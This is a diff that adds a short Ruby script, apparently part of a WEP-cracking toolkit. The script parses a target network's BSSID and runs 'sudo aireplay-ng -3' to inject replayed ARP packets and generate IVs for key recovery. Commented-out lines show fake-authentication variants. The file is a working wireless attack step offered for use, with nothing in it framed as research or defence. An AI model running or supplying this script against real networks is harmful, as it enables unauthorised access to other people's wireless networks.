@@ -1,0 +1,18 @@
+#!/usr/bin/ruby -w
+# associates and arps the target essid to generate IVs
+require 'airutils'
+
+if (ARGV[0]) then
+	essid = ARGV[0]
+	bssid, channel = AirUtils.parse_scan(ARGV[0])
+	#mymac = AirUtils.mymac()
+
+	# associate with the essid
+	
+	#syntax_aireplay1 = "sudo aireplay-ng -1 6000 -o 1 -q 10 -e %s -a %s -h %s %s" % [essid, bssid, $mac_iface_crack, $iface_crack]
+	#syntax_aireplay2 = "sudo aireplay-ng -1 0 -e %s -a %s -h %s %s" % [essid, bssid, $mac_iface_crack, $iface_crack]
+	syntax_aireplay1 = "sudo aireplay-ng -3 -b %s -h %s %s" % [bssid, $mac_iface_crack, $iface_crack]
+
+	puts syntax_aireplay1
+	system(syntax_aireplay1)
+end
